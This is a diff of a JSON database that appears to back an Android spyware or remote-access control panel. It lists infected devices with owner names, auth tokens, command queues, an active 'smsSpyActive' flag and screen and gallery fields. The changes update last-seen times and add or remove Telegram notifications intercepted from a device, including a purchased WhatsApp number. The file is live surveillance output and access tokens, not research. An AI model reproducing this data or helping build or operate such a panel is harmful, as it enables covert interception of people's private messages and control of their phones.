@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776775931188,
+    "lastSeen": 1776775955205,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776775931995,
+    "lastSeen": 1776775956648,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776775932496,
+    "lastSeen": 1776775956509,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Davii・5878 pesan baru dari 48 obrolan",
+        "time": "21/04 19:52",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775957711
+      },
       {
         "appName": "Telegram",
         "sender": "GB CPANEL BY PRABOWO: ZEEIN STORE",
@@ -14394,14 +14402,6 @@
         "time": "21/04 19:12",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776773545861
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Whatsapp\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6289*******69\n• Waktu: 21/04/2026, 19.12",
-        "time": "21/04 19:12",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776773545785
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776775932262,
+    "lastSeen": 1776775957475,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
